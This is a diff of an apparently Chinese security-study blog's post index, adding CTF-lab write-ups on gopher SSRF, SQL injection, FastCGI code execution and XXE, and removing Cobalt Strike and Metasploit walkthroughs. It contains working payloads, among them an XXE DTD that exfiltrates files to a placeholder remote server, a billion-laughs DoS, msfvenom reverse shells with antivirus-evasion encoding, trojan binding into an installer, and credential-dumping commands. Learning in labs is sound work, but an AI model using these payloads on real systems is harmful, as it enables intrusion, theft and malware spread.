+<p>生成payload为：<code>?url=gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250A%2520%2520%2520%2520Host%253A%2520127.0.0.1%250D%250A%2520%2520%2520%2520Content-Length%253A%2520292%250D%250A%2520%2520%2520%2520Content-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundary1lYApMMA3NDrr2iY%250D%250A%2520%2520%2520%2520------WebKitFormBoundary1lYApMMA3NDrr2iY%250D%250A%2520%2520%2520%2520Content-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522test.txt%2522%250D%250A%2520%2520%2520%2520Content-Type%253A%2520text/plain%250D%250A%2520%2520%2520%2520SSRF%2520Upload%250D%250A%2520%2520%2520%2520------WebKitFormBoundary1lYApMMA3NDrr2iY%250D%250A%2520%2520%2520%2520Content-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%2520%2520%2520%2520%25E6%258F%2590%25E4%25BA%25A4%250D%250A%2520%2520%2520%2520------WebKitFormBoundary1lYApMMA3NDrr2iY--</code>，得到flag<br><img src="/posts/1355767420/11.png"></p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="GET提交"><a href="#GET提交" class="headerlink" title="GET提交"></a>GET提交</h3><p>GET提交中，空格要编码成%20，直接敲一个空格或者+号是不行的。<br>要注意的是，<font color="red">在浏览器栏中提交特殊字符要做一次url编码，而在Hackbar和Burpsuite提交GET或POST数据要对构造的原始payload做两次url编码。</font><br><img src="/posts/1355767420/12.png"></p>
+<h3 id="POST提交"><a href="#POST提交" class="headerlink" title="POST提交"></a>POST提交</h3><p>首先<code>gopher://127.0.0.1:80/_</code>起手，然后将下面的代码进行两次url编码：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST</span> /Less-<span class="number">11</span>/index.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">Content</span>-Type:application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content</span>-Length:<span class="number">53</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">uname</span>=-<span class="number">1</span>&#x27;union select <span class="number">1</span>,<span class="number">2</span> #&amp;passwd=<span class="number">123</span>&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>拼接之后进行POST提交即可</p>
+<h2 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h2><p>FastCGI原理：<a href="https://blog.csdn.net/mysteryflower/article/details/94386461" title="Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写">https://blog.csdn.net/mysteryflower/article/details/94386461</a></p>
+<p><img src="/posts/1355767420/14.png"></p>
+<p>简单地概括一下<font color="red">漏洞产生的原理：</font>  </p>
+<h3 id="PHP-FPM的fix-pathinfo配置："><a href="#PHP-FPM的fix-pathinfo配置：" class="headerlink" title="PHP-FPM的fix_pathinfo配置："></a>PHP-FPM的fix_pathinfo配置：</h3><p>PHP-FPM的fix_pathinfo选项用于支持Path Info模式，在打开时，<strong>如果SCRIPT_FILENAME指定的文件不存在，PHP-FPM会逐级去掉路径的最后一部分，直到找到存在的文件。</strong><br>这种机制会导致Nginx传递的路径信息被PHP-FPM错误解析和执行，形成解析漏洞。</p>
+<p><strong>利用：</strong>通过构造特定的URL，如<code>http://127.0.0.1/favicon.ico/.php</code>，使Nginx传递的SCRIPT_FILENAME变为<code>/var/www/html/favicon.ico/.php</code>。<br>PHP-FPM根据fix_pathinfo配置，去掉.php后，解析并执行<code>/var/www/html/favicon.ico</code>文件，导致解析漏洞。</p>
+<h3 id="PHP-FPM的安全配置："><a href="#PHP-FPM的安全配置：" class="headerlink" title="PHP-FPM的安全配置："></a>PHP-FPM的安全配置：</h3><p>PHP-FPM的security.limit_extensions配置项限制了可执行文件的后缀类型，防止任意文件被执行。<br>默认情况下只允许执行.php文件，但如果配置不当，可能导致任意文件执行漏洞。</p>
+<p><strong>利用：</strong>如果PHP-FPM的9000端口暴露在公网，攻击者可以直接与PHP-FPM通信，构造FastCGI请求。<br>通过构造特定的环境变量，如PHP_VALUE和PHP_ADMIN_VALUE，设置PHP配置项。例如：</p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;<span class="number">1234</span>5&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,</span><br><span class="line">    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>设置<code>auto_prepend_file = php://input</code>和<code>allow_url_include = On</code>，将恶意代码放在请求的Body中，实现任意代码执行。</p>
+<h3 id="CTFHub技能树–FastCGI协议"><a href="#CTFHub技能树–FastCGI协议" class="headerlink" title="CTFHub技能树–FastCGI协议"></a>CTFHub技能树–FastCGI协议</h3><p>1、要利用FastCGI协议，首先找到目标主机上存在的.php后缀文件，这里输入<code>url=file:///var/www/html/index.php</code>，查看源代码发现是存在的。<br><img src="/posts/1355767420/15.png"></p>
+<p>2、在kali中打开gopherus，输入命令构造payload：先输入php文件所在的位置，然后输入要执行的命令<code>ls /</code>。<br><img src="/posts/1355767420/16.png"></p>
+<p>3、将生成的payload放到bp中再进行一次url编码<br><img src="/posts/1355767420/17.png"></p>
+<p>4、GET传入payload，得知flag的真正名字，于是再进行一次payload的构造：改变命令为<code>cat /flag_198d5102767c129bfeace112e4473230</code>。<br><img src="/posts/1355767420/18.png"></p>
+<p>5、将payload再次url编码后传入即可获得flag<br><img src="/posts/1355767420/19.png"></p>
 ]]></content>
       <categories>
-        <category>web攻防</category>
+        <category>web漏洞</category>
       </categories>
       <tags>
         <tag>web攻防</tag>
-        <tag>靶场</tag>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XXE漏洞利用</title>
+    <url>/posts/4120014032.html</url>
+    <content><![CDATA[<h2 id="XXE漏洞简述"><a href="#XXE漏洞简述" class="headerlink" title="XXE漏洞简述"></a>XXE漏洞简述</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>XXE漏洞（<strong>X</strong>ML E<strong>x</strong>ternal <strong>E</strong>ntity Injection）是一种常见的网络安全漏洞，主要发生在应用程序解析XML输入时。该漏洞的成因是应用程序没有对外部实体进行限制或过滤，导致攻击者可以注入恶意的外部实体，从而执行一系列危害性操作</p>
+<span id="more"></span>
+<br>
+
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>XXE漏洞的<strong>核心原理是利用XML文档中的DTD（文档类型定义）部分来引入外部实体。</strong>攻击者通过构造特定的<strong>XML文档</strong>，包含恶意的外部实体引用，使得服务器在解析这些XML文档时，会按照这些外部实体的配置执行，从而达到读取文件、执行系统命令、内网探测等目的。</p>
+<p>所以，这里先对XML文档和XML文档中的DTD做一些解释。<br><br></p>
+<h3 id="XML文档"><a href="#XML文档" class="headerlink" title="XML文档"></a>XML文档</h3><p>XML 指可扩展标记语言（eXtensible Markup Language）。<br>XML 被设计<strong>用来传输和存储数据</strong>，不用于表现和展示数据，HTML 则用来表现数据。</p>
+<p>下面是一个简单的XML实体</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTD--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">body</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">warning</span> <span class="string">&quot;Warning: Something bad happened... please refresh and try again.&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">message</span>&gt;</span> <span class="symbol">&amp;warning;</span> <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<br>
+
+<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>文档类型定义（DTD）是XXE漏洞的重点利用对象，DTD用来为XML文档定义语义约束。可以嵌入在XML文档中（内部声明），也可以独立的放在一个文件中（外部引用）。</p>
+<p>DTD中一些重要的关键字包括：<br>DOCTYPE（DTD的声明）<br>ENTITY（实体的声明）<br>SYSTEM、PUBLIC（外部资源申请）  </p>
+<p>1、DTD文档声明方式区别：<br>内部文档：<br><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
+<p>外部文档：<br><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</code></p>
+<p>内外部文档结合:<br><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;</code></p>
+<p>2、参数实体声明:</p>
+<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>&gt;</span> [</span></span><br><span class="line"><span class="language-xml">    <span class="meta">&lt;!ENTITY % b <span class="string">&quot;&lt;!ENTITY b1 &quot;</span>hello<span class="string">&quot;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl">    %b;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">]&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;b1<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p><strong>参数实体</strong>用<code>% name</code>申明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用。<br><strong>其余实体</strong>直接用<code>name</code>申明，引用时用<code>&amp;name;</code>，只能在DTD中申明，可在xml文档中引用</p>
+<p>外部引用可支持http、file等协议，不同的语言支持的协议不同，但存在一些通用的协议。例如：<br><img src="/posts/4120014032/1.png"></p>
+<p>上图是默认支持协议，还可以支持其他协议，如PHP支持的扩展协议有：<br><img src="/posts/4120014032/2.png"><br><br></p>
+<h3 id="XXE漏洞的危害"><a href="#XXE漏洞的危害" class="headerlink" title="XXE漏洞的危害"></a>XXE漏洞的危害</h3><p>XXE漏洞可能导致以下严重后果：<br><strong>文件读取：</strong>攻击者可以读取服务器上的任意文件，包括配置文件、日志文件等。<br><strong>命令执行：</strong>攻击者可以执行系统命令，进行远程代码执行。<br><strong>内网渗透：</strong>攻击者可以探测内网端口，甚至攻击内网网站。<br><strong>拒绝服务攻击（DoS）：</strong>攻击者可以发起拒绝服务攻击，导致目标系统瘫痪。<br><br></p>
+<h2 id="XXE漏洞利用"><a href="#XXE漏洞利用" class="headerlink" title="XXE漏洞利用"></a>XXE漏洞利用</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>利用file、http协议，在DTD外部引用中注入，从而获取文件内容。任意文件读取有分为<strong>有回显</strong>和<strong>无回显</strong>两种。</p>
+<h4 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h4><p>直接读取文件：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里将网站中的flag.php文件以base64编码的方式取出，赋值给了实体f，<br>然后实体f的值作为元素x中的字符串数据被php解析的时候取出，作为对象里的内容，最后被打印出来。<br><br></p>
+<h4 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h4><p>没有回显的话可以把数据发送到远程服务器:<br>1.<strong>利用file等协议</strong>去读取本地文件<br>2.<strong>利用http协议</strong>带出实体  </p>
+<p>所以这里需要两个payload：</p>
+<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?xml verstion=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span>[</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://远程服务器ip/evil.dtd&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">        %dtd;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">        %send;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">]&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>远程服务器的evil.dtd文件内容（evil.dtd内部的%号要进行实体编码成&amp;#x25。）：  </p>
+<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://远程服务器ip/?data=%file;&#x27;&gt;&quot;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl">%all;</span></span><br></pre></td></tr></table></figure>
+<p><font color="red">执行流程：</font><br>1、php过滤器将flag进行base64编码后赋值给<code>%file</code>实体<br>2、解析<code>%dtd</code>时，将会访问远程服务器的<code>evil.dtd</code>文件<br>3、在<code>evil.dtd</code>内解析<code>%all</code>实体时，会将<code>%file</code>实体带入<br>4、通过访问指定的链接，将数据赋给<code>%send</code><br>5、访问接受数据的服务器中的日志信息，可以看到数据。<br><br></p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>XXE漏洞造成命令执行很少见，要求在php环境下，xml要装有expect扩展，然而该扩展默认是没有安装的,所以这里不进行讲解。</p>
+<h3 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h3><p>这里其实和读取文件类似，只不过文件地址变成了url</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Dos攻击"><a href="#Dos攻击" class="headerlink" title="Dos攻击"></a>Dos攻击</h3><p>这个方法通过创建大量的实体引用，耗尽系统资源，导致拒绝服务.</p>
+<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="params">&lt;?xml version=&quot;<span class="number">1.0</span>&quot;?&gt;</span></span><br><span class="line"><span class="params">&lt;!DOCTYPE data [</span></span><br><span class="line"><span class="params">  &lt;!ENTITY a &quot;a&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY b &quot;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;<span class="variable">&amp;a</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY c &quot;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;<span class="variable">&amp;b</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY d &quot;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;<span class="variable">&amp;c</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY e &quot;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;<span class="variable">&amp;d</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY f &quot;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;<span class="variable">&amp;e</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY g &quot;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;<span class="variable">&amp;f</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY h &quot;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;<span class="variable">&amp;g</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY i &quot;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;<span class="variable">&amp;h</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY j &quot;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;<span class="variable">&amp;i</span>;&quot;&gt;</span></span><br><span class="line">  <span class="params">&lt;!ENTITY k &quot;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;<span class="variable">&amp;j</span>;&quot;&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="params">&lt;data&gt;</span><span class="variable">&amp;k</span><span class="punctuation">;</span><span class="params">&lt;/data&gt;</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+      </categories>
+      <tags>
+        <tag>web攻防</tag>
+        <tag>web漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -191,122 +279,6 @@ https://blog.csdn.net/2301_76690905/article/details/134533626  ]]></content>
       <tags>
         <tag>web攻防</tag>
         <tag>代码绕过</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Cobaltstrike网络共享后门</title>
-    <url>/posts/3343148988.html</url>
-    <content><![CDATA[<h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><span id="more"></span>
-
-<p>1、查看kali虚拟机的IP，打开cobalt strike 进行连接<br><img src="/posts/3343148988/1.png"><br><br></p>
-<p>2、把生成的后门exe文件放到root下<br><img src="/posts/3343148988/2.png"><br><br></p>
-<p>3、输入以下命令以开启python服务，在kali里打开浏览器输入“127.0.0.1：端口号”或者“kali的IP ： 端口号”，验证网站是否能打开并存在后门文件。<br><img src="/posts/3343148988/3.png"><br><br></p>
-<p>4、在本机上打开网站并下载文件（先把病毒查杀关闭）<br><img src="/posts/3343148988/4.png"><br><br></p>
-<p>5、下载打开后可以在kali里看到已经有一个监视窗口了，我们可以对其进行操作<br><img src="/posts/3343148988/5.png"></p>
-<p><img src="/posts/3343148988/6.png"><br><br></p>
-<p>6、输入以下命令开启apache服务，在etc&#x2F;apache2&#x2F;ports.conf 里查看启用的端口号<br><img src="/posts/3343148988/7.png"><br><br></p>
-<p>7、输入 “IP地址：端口号” 就可以看到服务已经成功启动了<br><img src="/posts/3343148988/8.png"><br><br></p>
-<p>8、将var&#x2F;www&#x2F;html内的index.html 移除，把后门文件复制到文件夹内，打开网站后可以看到文件的存在。<br><img src="/posts/3343148988/9.png"><br><br></p>
-<h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>1、在cobalt strike内打开文件托管<br><img src="/posts/3343148988/10.png"><br><br></p>
-<p>2、输入相应的信息，运行文件托管，成功后复制URL到本机浏览器打开<br><img src="/posts/3343148988/11.png"></p>
-<p><img src="/posts/3343148988/12.png"><br><br></p>
-<p>3、下载文件后将文件后缀改回exe即可运行并连接cobalt strike。<br><img src="/posts/3343148988/13.png"></p>
-]]></content>
-      <categories>
-        <category>web攻防</category>
-      </categories>
-      <tags>
-        <tag>web攻防</tag>
-        <tag>工具使用</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Metasploit</title>
-    <url>/posts/1051313787.html</url>
-    <content><![CDATA[<h2 id="Metasploit的免杀和基本使用"><a href="#Metasploit的免杀和基本使用" class="headerlink" title="Metasploit的免杀和基本使用"></a>Metasploit的免杀和基本使用</h2><p>1、在kali里打开Metasploit，创建payload，输入<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=*** lport=*** -f exe -o ***(保存的文件名字及后缀)</code></p>
-<span id="more"></span>
-<p><img src="/posts/1051313787/1.png"></p>
-<p><img src="/posts/1051313787/2.png"><br><br></p>
-<p>2、依次输入以下代码，以开启监听器<br><img src="/posts/1051313787/3.png"><br><br></p>
-<p>3、通过共享文件（hello.exe），主机接受文件发现windows还是会查杀，于是思考对文件进行免杀</p>
-<p>4、在kali里输入<code>msfvenom -l encoders</code>，得到编码列表。<br>注意：这里不是所有的编码方式都可以在windows系统上使用，这里我们将使用x86&#x2F;shikata_ga_nai，它是为数不多评级为excellent的编码<br>经过编码处理后的payload生成：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//-b 特征码绕过  -i 编码次数</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.225.130 lport=8765 -e x86/shikata_ga_nai -b<span class="string">&quot;\x00&quot;</span> -i 20 -f exe -o pl3.exe</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/1051313787/4.png"><br><br></p>
-<p>5、这里我们使用notepad作为木马载体，把木马捆绑在程序上，以便木马的传播<br><img src="/posts/1051313787/5.png"><br><br></p>
-<p>6、输入以下代码来将木马捆绑到notepad上：</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">msfvenom-<span class="selector-tag">p</span> windows/shell_reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">255.130</span> lport=<span class="number">9000</span> </span><br><span class="line">-e x86/shikata_ga_nai -x npp.<span class="number">7.9</span><span class="selector-class">.Installer</span><span class="selector-class">.exe</span> -<span class="selector-tag">i</span> <span class="number">12</span> -f exe -o /home/kali/Desktop/npp<span class="selector-class">.Installer</span>.exe</span><br></pre></td></tr></table></figure>
-<p>这里解释一下其中的部分参数的含义：<br>-p：–payload，指定特定的 Payload，如果被设置为-，那么从标准输入流中读取。几乎支持全平台。 指定操作系统<br>-l：–list，列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, all<br>-n：–nopsled，指定 nop在 payload中的数量<br>-f：–format，指定 Payload的输出格式（–listformats：列出所有可用的输出格式） php exe<br>-e：–encoder，指定使用编码的encoder<br>X86&#x2F;shikata_ga_nai最流行的编码，等级为excellent；<br>解码和编码过程都是随机生成的；cmd&#x2F;powershell_base64也为excellent；<br>-a：–arch，指定目标系统架构 arm-安卓 x86 mips工业系统-路由器-交换机<br>–platform：指定目标系统平台 linus windows ios 安卓<br>-s：–space，设置未经编码的 Payload的最大长度（–encoder-space：编码后的 Payload的最大长度）<br>-b：–bad-chars，设置需要在 Payload中避免出现的字符，例如：’\0f’、’\x00’等<br>-i：–iterations，设置 Payload的编码次数<br>–smallest：尽可能生成最短的 Payload<br>-o：–out，保存 Payload到文件<br>-c：–add-code，指定一个附加的win32 shellcode文件<br>-x：–template，指定一个特定的可执行文件作为模板<br>-k：–keep，保护模板程序的功能，注入的payload作为一个新的进程运行<br>-v, –var-name，指定一个自定义的变量，以确定输出格式<br>-t, –timeout，从STDIN读取有效负载时要等待的秒数（默认为30，0 为禁用）<br>-h, –help，查看帮助选项<br>–help-formats，查看msf支持的输出格式列表  </p>
-<p><img src="/posts/1051313787/6.png"><br><br></p>
-<p>7、启动python服务共享文件，发现还是会被查杀。</p>
-<p>8、使用upx对文件进行加壳处理，但是还是不行<br><img src="/posts/1051313787/7.png"><br><br></p>
-<p>9、使用多重编码试图实现免杀，并更改编码次数，甚至更改载体软件，但是最终都以失败告终。<br><img src="/posts/1051313787/8.png"></p>
-<p><img src="/posts/1051313787/9.png"><br><br></p>
-<p>10、于是只能关闭病毒实时查杀进行接下来的实验，免杀这一部分等后面再进行补充。</p>
-<p>11、生成payload，并在本机上接受该exe<br><img src="/posts/1051313787/10.png"><br><br></p>
-<p>12、输入shell切换到目标主机window cmd shell里面，chcp 65001 防止乱码，字符编码65001 是 utf-8，输入exit即可退出shell。<br><img src="/posts/1051313787/11.png"><br><br></p>
-<p>13、从meterpreter退出到MSF框架：输入命令<code>background</code> 把我们获得的meterpreter会话挂载到后台运行。<br><img src="/posts/1051313787/12.png"><br><br></p>
-<p>14、输入session -l（字母L）可以查看所有会话，如果要进入先前的会话，输入sessions -id即可<br><img src="/posts/1051313787/13.png"><br><br></p>
-<p>15、常见命令：</p>
-<pre><code>sysinfo             									#查看目标主机系统信息
-run scraper         									#查看目标主机详细信息
-run hashdump        									#导出密码的哈希
-load kiwi           									#加载mimikatz
-ps                  									#查看目标主机进程信息
-pwd                		 							    #查看目标当前目录(windows)
-getlwd              									#查看目标当前目录(Linux)
-search -f *.jsp -d e:\                					#搜索E盘中所有以.jsp为后缀的文件
